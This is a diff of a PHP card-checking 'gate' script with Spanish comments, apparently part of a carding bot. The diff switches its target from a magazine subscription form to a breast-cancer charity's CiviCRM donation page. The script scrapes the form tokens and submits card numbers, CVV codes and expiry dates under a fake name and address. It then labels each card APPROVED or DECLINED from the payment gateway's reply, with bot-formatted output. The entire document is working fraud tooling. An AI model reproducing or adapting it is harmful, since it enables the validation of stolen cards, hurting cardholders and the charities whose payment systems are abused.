@@ -325,6 +325,7 @@ $live_array = array(
     "The card's security code is incorrect.",
     "Your card's expiration month is invalid.",
     'Card Issuer Declined CVV',
+    'Credit card expiration date is invalid.',
     'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.',
     'Insufficient Funds',
     'Transaction not permitted by issuer',
@@ -3891,6 +3892,8 @@ $id_text = file_get_contents("ID");
 $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
+
+
 $curl = curl_init('https://binlist.io/lookup/'.$bin.'');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
@@ -3904,50 +3907,48 @@ $brand = "Unavailable";
 }
 //VARIABLES//
 $MV = ucwords(strtolower(trim($brand)));
-$cc = chunk_split($cc, 4, ' ');
-$fecha = date('Y/m/d');
-
-
+echo "$MV\n";
 
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://panoramitalia.com/index.php/subscribe/',
+  CURLOPT_URL => 'https://breastcancereducation.org/make-a-donation',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
+  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
-    'Upgrade-Insecure-Requests: 1',
-    'Sec-GPC: 1',
-    'Accept-Language: es-US,es;q=0.5',
-    'Sec-Fetch-Site: same-origin',
-    'Sec-Fetch-Mode: navigate',
-    'Sec-Fetch-User: ?1',
-    'Sec-Fetch-Dest: document',
-    'Referer: https://panoramitalia.com/',
+    'upgrade-insecure-requests: 1',
+    'accept-language: es-US,es;q=0.9',
   ],
 ]);
 
+
 $response = curl_exec($curl);
 $err = curl_error($curl);
-$patron = '/name="_cf_verify" value="([^"]+)"/';
-preg_match($patron, $response, $coincidencias);
-$token = $coincidencias[1];
+$patron_qfKey = '/<input name="qfKey" type="hidden" value="([^"]+)"/';
+$patron_MAX_FILE_SIZE = '/<input name="MAX_FILE_SIZE" type="hidden" value="([^"]+)"/';
+preg_match($patron_qfKey, $response, $coincidencias_qfKey);
+preg_match($patron_MAX_FILE_SIZE, $response, $coincidencias_MAX_FILE_SIZE);
+
+$qfKey = $coincidencias_qfKey[1];
+$MAX_FILE_SIZE = $coincidencias_MAX_FILE_SIZE[1];
 curl_close($curl);
 
-
+/*echo "qfKey: $qfKey\n";
+echo "MAX_FILE_SIZE: $MAX_FILE_SIZE\n";
+echo "-------------------------------\n";
+*/
 
 $curl = curl_init();
-
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
+  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
@@ -3955,79 +3956,210 @@ curl_setopt_array($curl, [
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
   CURLOPT_POSTFIELDS => [
-    '_cf_verify' => ''.$token.'',
-    '_wp_http_referer' => '/index.php/subscribe/',
-    '_cf_frm_id' => 'CF6317ae143565f',
-    '_cf_frm_ct' => '1',
-    'cfajax' => 'CF6317ae143565f',
-    '_cf_cr_pst' => '335',
-    'email' => '',
-    'fld_1604923' => 'Canada',
-    'fld_3782878' => '1 year ($20) - 4 issues',
-    'fld_6223773' => 'First time subscription',
-    'fld_3249557' => '1',
-    'fld_7659764' => ''.$correo.'',
-    'fld_5990741' => ''.$cc.'',
-    'fld_1615852' => ''.$mes.' / '.$ano.'',
-    'fld_4133199' => ''.$cvv.'',
-    'fld_2356280' => ''.$MV.'',
-    'fld_950613' => ''.$nombre.'',
-    'fld_2278346' => ''.$apellido.'',
-    'fld_6787259' => ''.$telefono.'',
-    'fld_2041995' => 'United States',
-    'fld_5232305' => '6195 bollinger rd',
-    'fld_4491871' => '',
-    'fld_3911000' => 'New york',
-    'fld_2494407' => '10010',
-    'fld_778305' => 'AZ',
-    'fld_4577367' => '20.00',
-    'fld_3144093' => 'click',
-    'fld_5757786' => ''.$fecha.'',
-    'fld_2545505' => '101205650',
-    'fld_6974264' => '100',
-    'alt_s' => '',
-    'gxlkmf1070' => '236533',
-    'instance' => '1',
-    'request' => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
-    'formId' => 'CF6317ae143565f',
-    'postDisable' => '0',
-    'target' => '#caldera_notices_1',
-    'loadClass' => 'cf_processing',
-    'loadElement' => '_parent',
-    'hiderows' => 'true',
-    'action' => 'cf_process_ajax_submit',
-    'cfajax' => 'CF6317ae143565f',
-    'template' => '#cfajax_CF6317ae143565f-tmpl',
+    'qfKey' => ''.$qfKey.'',
+    'MAX_FILE_SIZE' => '67108864',
+    'hidden_processor' => '1',
+    'payment_processor_id' => '3',
+    'priceSetId' => '5',
+    'selectProduct' => '',
+    '_qf_default' => 'Main:upload',
+    'price_3' => '0',
+    'price_4' => '5',
+    'email-5' => 'Dausitherer@cuvox.de',
+    'honor[prefix_id]' => '',
+    'honor[first_name]' => '',
+    'honor[last_name]' => '',
+    'honor[email-1]' => '',
+    'honor[note]' => '',
+    'honor[image_URL]' => '',
+    'custom_28' => '',
+    'custom_29' => '',
+    'custom_31' => '',
+    'custom_30' => '',
+    'credit_card_type' => ''.$MV.'',
+    'credit_card_number' => ''.$cc.'',
+    'cvv2' => ''.$cvv.'',
+    'credit_card_exp_date[M]' => ''.$mes.'',
+    'credit_card_exp_date[Y]' => ''.$ano.'',
+    'billing_first_name' => 'Carlos',
+    'billing_middle_name' => '',
+    'billing_last_name' => 'Perez',
+    'billing_street_address-5' => '6195 bollinger rd',
+    'billing_city-5' => 'New york',
+    'billing_country_id-5' => '1228',
+    'billing_state_province_id-5' => '1002',
+    'billing_postal_code-5' => '10010',
+    '_qf_Main_upload' => '1',
   ],
-  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
+  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=XNtBXVqyQ0KrTlM4gSRQtvEGWBgZV9OHty5D7p9k0cw',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+//    'cache-control: max-age=0',
+//    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+//    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
-    'X-Requested-With: XMLHttpRequest',
-    'Accept-Language: es-US,es;q=0.5',
-    'Origin: https://panoramitalia.com',
-    'Referer: https://panoramitalia.com/index.php/subscribe/',
+    'origin: https://breastcancereducation.org',
+//    'content-type: multipart/form-data; boundary=----WebKitFormBoundarya03U4Y25Snzw7o5r',
+//    'upgrade-insecure-requests: 1',
+//    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
+//    'sec-fetch-site: same-origin'
+//    'sec-fetch-mode: navigate',
+//    'sec-fetch-user: ?1',
+//    'sec-fetch-dest: document',
+    'referer: https://breastcancereducation.org/make-a-donation',
+//    'priority: u=0, i',
   ],
 ]);
 
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+
+
+
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=XNtBXVqyQ0KrTlM4gSRQtvEGWBgZV9OHty5D7p9k0cw',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'cache-control: max-age=0',
+    'upgrade-insecure-requests: 1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-user: ?1',
+    'sec-fetch-dest: document',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-ch-ua-platform: "Android"',
+    'referer: https://breastcancereducation.org/make-a-donation',
+    'priority: u=0, i',
+  ],
+]);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
-$data = json_decode($response, true);
-$respo = strip_tags($data['html']);
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$patron = '/<input name="qfKey" type="hidden" value="([^"]+)"/';
+preg_match($patron, $response, $coincidencias);
+$qfKey2 = $coincidencias[1];
+//echo "qfKey: $qfKey2\n";
+
 curl_close($curl);
 
-////EXTRAE EL MENSAJE DE SUSCRPCION////
-$partes = explode('.', $respo);
-$respo = implode('.', array_slice($partes, 0, 2));
-if (!preg_match('/\.$/', $respo)) {
-    $respo .= '.';
-	if ($respo == "Subscription form has been successfully submitted. Thank you."){
-    $partes = explode(".", $respo);
-    $gracias = trim(ucwords($partes[1]));
-    $respo = "$gracias 20$";
-	}
+
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'qfKey='.$qfKey2.'&_qf_default=Confirm%3Anext&custom_28=&custom_29=&custom_31=&custom_30=&_qf_Confirm_next=1',
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=XNtBXVqyQ0KrTlM4gSRQtvEGWBgZV9OHty5D7p9k0cw',
+  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/x-www-form-urlencoded',
+    'cache-control: max-age=0',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-ch-ua-platform: "Android"',
+    'origin: https://breastcancereducation.org',
+    'upgrade-insecure-requests: 1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-user: ?1',
+    'sec-fetch-dest: document',
+    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
+    'priority: u=0, i',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+
+
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Main_display=true&qfKey='.$qfKey2.'',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=XNtBXVqyQ0KrTlM4gSRQtvEGWBgZV9OHty5D7p9k0cw',
+  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'cache-control: max-age=0',
+    'upgrade-insecure-requests: 1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-user: ?1',
+    'sec-fetch-dest: document',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-ch-ua-platform: "Android"',
+    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey2.'',
+    'priority: u=0, i',
+  ],
+]);
+
+$response = curl_exec($curl);
+file_put_contents('index.html', $response);
+$err = curl_error($curl);
+
+$patron = '/<span class="msg-text">(.*?)<\/span>/';
+preg_match($patron, $response, $coincidencias);
+$mensaje1 = $coincidencias[1];
+
+if (!empty($mensaje1)){
+
+$patron = '/Payment Processor Error message :\d*\s*(.*)/';
+preg_match($patron, $mensaje1, $coincidencias);
+$mensaje = trim($coincidencias[1]);
+
+} else {
+$patron = '/<li>(.*?)<\/li>/';
+preg_match($patron, $response, $coincidencias);
+$mensaje = $coincidencias[1];
 }
+//echo "Mensaje: $mensaje\n";
+
+$respo = $mensaje;
+	
+curl_close($curl);
 
 $timetakeen = (microtime(true) - $startTime);
 $time = substr_replace($timetakeen, '', 4);
@@ -4037,10 +4169,10 @@ $proxy = "LIVE ✅";
 
 $bin = "<code>".$bin."</code>";
 $lista = "<code>".$lista."</code>";
-
+/*
 if ($respo == 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.'){
 $respo = 'Card Issuer Declined CVV';
-}
+}*/
 
 if (empty($respo)) {
         $respo = $response;
@@ -4048,13 +4180,13 @@ if (empty($respo)) {
 
 // Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
 if (array_in_string($respo, $live_array)) {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 20$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = True;
-} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Transaction refused due to risk model.') !== false) {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 20$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+} elseif (strpos($respo, 'Expiration Date is a required field.') !== false || strpos($respo, 'Please enter a valid Card Verification Number') !== false || strpos($respo, 'This transaction has been declined.') !== false){
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = False;
 } else {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 20$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = False;
 }
 
